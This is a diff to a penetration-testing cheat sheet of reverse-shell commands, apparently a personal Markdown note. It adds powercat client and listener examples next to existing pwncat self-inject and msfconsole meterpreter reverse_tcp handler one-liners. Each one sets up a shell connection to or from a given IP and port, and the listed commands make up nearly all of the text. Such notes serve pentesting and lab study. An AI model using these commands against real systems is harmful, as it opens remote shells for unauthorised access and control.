@@ -11,6 +11,7 @@
 - [[#xterm]]
 - [[#pwncat]]
 - [[#msfconsole]]
+- [[#powercat]]
 
 
 ### Bash
@@ -83,11 +84,25 @@ p.waitFor()
 pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445+3
 ```
 
+[[Pwncat]]
+
 ### msfconsole
 ```bash
 msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.10; set lport 9009; exploit"
+```
+
+### Powercat
+**Listener + client**
+
+```powershell
+Basic Client:
+    powercat -c 10.1.1.1 -p 443
+Basic Listener:
+    powercat -l -p 8000
 
 ```
+
+[[Powercat]]
 
 ### xterm
 
